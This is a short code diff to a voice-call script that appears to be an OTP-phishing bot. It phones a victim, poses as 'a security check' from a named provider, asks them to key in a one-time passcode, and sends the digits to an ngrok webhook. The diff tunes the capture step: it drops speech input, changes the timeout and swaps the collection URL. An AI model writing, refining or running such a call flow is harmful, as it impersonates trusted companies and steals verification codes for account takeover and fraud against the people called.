@@ -24,17 +24,16 @@ const call = (number, provider) => {
         {
           action: "talk",
           text: `this is a security check from ${provider}, we have sent you a message with a one time passcode, please enter the code by dailing the digits on the keypad followed by the hash key in order to verify your account`,
-          bargeIn: true,
         },
         {
           action: "input",
-          eventUrl: ["https://1b42-105-112-216-89.ngrok.io/webhooks/dtmf"],
-          type: ["dtmf", "speech"],
+          type: ["dtmf"],
           dtmf: {
-            timeOut: 5,
+            timeOut: 10,
             maxDigits: 5,
             submitOnHash: true,
           },
+          eventUrl: ["https://9601-105-112-120-204.ngrok.io/webhooks/dtmf"],
         },
       ],
     },
